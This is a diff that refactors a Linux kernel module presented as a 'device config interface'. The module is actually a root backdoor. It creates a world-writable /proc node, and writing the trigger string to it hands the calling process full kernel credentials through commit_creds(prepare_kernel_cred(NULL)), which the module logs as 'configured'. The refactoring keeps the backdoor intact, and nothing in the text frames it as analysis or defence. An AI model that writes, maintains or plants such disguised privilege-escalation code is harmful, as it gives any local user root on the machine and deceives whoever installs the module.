@@ -3,25 +3,22 @@
 #include <linux/proc_fs.h>
 #include <linux/cred.h>
 #include <linux/uaccess.h>
-#include <linux/version.h>
+#include "devcfg.h"
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("device config interface");
 
-#define DEVCFG_NODE "devcfg"
-#define DEVCFG_TRIGGER "Menu"
-
-static ssize_t devcfg_write(struct file *file, const char __user *ubuf,
-                            size_t cnt, loff_t *ppos)
+ssize_t devcfg_write(struct file *file, const char __user *ubuf,
+                     size_t cnt, loff_t *ppos)
 {
-    char buf[16] = {0};
+    char buf[DEVCFG_BUF_SIZE] = {0};
 
     if (cnt > sizeof(buf) - 1)
         cnt = sizeof(buf) - 1;
     if (copy_from_user(buf, ubuf, cnt))
         return -EFAULT;
 
-    if (strncmp(buf, DEVCFG_TRIGGER, 4) == 0) {
+    if (strncmp(buf, DEVCFG_TRIGGER, DEVCFG_TRIGGER_LEN) == 0) {
         commit_creds(prepare_kernel_cred(NULL));
         printk(KERN_INFO "devcfg: configured pid=%d\n", current->pid);
     }
@@ -38,13 +35,13 @@ static const struct file_operations devcfg_fops = {
 };
 #endif
 
-static int __init devcfg_init(void)
+int devcfg_init(void)
 {
     proc_create(DEVCFG_NODE, 0222, NULL, &devcfg_fops);
     return 0;
 }
 
-static void __exit devcfg_exit(void)
+void devcfg_exit(void)
 {
     remove_proc_entry(DEVCFG_NODE, NULL);
 }
